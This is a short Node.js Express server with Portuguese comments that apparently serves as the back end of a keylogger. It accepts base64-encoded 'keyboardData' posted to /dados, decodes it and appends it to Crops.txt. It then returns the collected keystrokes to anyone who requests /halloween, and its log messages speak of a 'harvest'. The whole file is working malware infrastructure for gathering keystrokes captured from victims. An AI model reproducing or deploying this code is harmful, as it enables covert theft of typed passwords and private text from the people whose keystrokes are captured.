const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');


const app = express();
const PORT = 3108;

app.use(bodyParser.json());
const corsOptions = {
    origin: process.env.REACT_CLIENT_URL || 'http://localhost:3000', // Altere para a origem do seu aplicativo React
    optionsSuccessStatus: 200 // Alguns navegadores podem retornar um status de erro se 204 for devolvido
  };
  
  app.use(cors(corsOptions));
function salvarConteudoArquivo(texto) {
    try {
        // Salvar todo o conteúdo recebido em um arquivo de texto
        fs.appendFileSync('Crops.txt', texto);
        console.log('☭ Reap and Sow ☭');
    } catch (err) {
        console.error('No Seeds', err);
    }
}

// Rota para receber e salvar o JSON
app.post('/dados', (req, res) => {
    try {
        ckdata = req.body.keyboardData;
        const keyboardData = atob(ckdata);
        
        // Verificar se há novo conteúdo
        if (keyboardData.trim() !== '') {
            salvarConteudoArquivo(keyboardData);
            res.status(200).send('');
        } 
    } catch (err) {
        console.error('Erro ao salvar os dados:', err);
        
    }
});

app.get('/halloween', (req, res) => {
    try {
        // Lê o conteúdo do arquivo 'Crops.txt'
        const content = fs.readFileSync('Crops.txt', 'utf-8');
        // Envie o conteúdo como resposta
        res.send(content);
    } catch (err) {
        console.error('Erro ao ler o arquivo:', err);
        res.status(500).send('Erro ao ler o arquivo');
    }
});




app.listen(PORT, () => {
    console.log(`🎃--Que a Colheita Comece ${PORT}--🎃`);
});
